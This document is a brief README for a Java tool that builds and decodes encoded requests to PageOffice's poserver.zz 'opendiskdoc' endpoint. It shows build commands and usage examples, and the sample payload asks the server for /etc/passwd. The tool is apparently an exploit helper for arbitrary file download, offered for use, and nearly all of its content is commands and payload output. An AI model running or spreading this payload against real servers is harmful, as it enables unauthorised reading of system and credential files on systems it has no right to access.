# PageOffice_FileDownload
## package
```
javac Main.java
jar -cvmf MANIFEST.MF PageOffice-FileDownload.jar *.class
```
## env
`jdk1.8`
## Usage
### 1. encode
```
java -jar PageOffice-FileDownload.jar encode /etc/passwd

encode payload:
poserver.zz?pgop=opendiskdoc&id=KmcgY3MtK3IpLSRfOXE9YmpkL2orbBdrKztnLDh2OCQpbSJyK2w4cj9uKzsXbiRqL2EXci9tIi0lYThjOCs5ciZjF2s=
```
### 2. decode
```
java -jar PageOffice-FileDownload.jar decode KmcgY3MtLG0jY2VxJnQjZSYxYjVlcStwOmMmcWVkOXEpbiZtKC58Ln8tOXIXcDhzJCs

decode payload:
file=/etc/passwd&filename=1.txt&contenttype=application/octet-stream
```
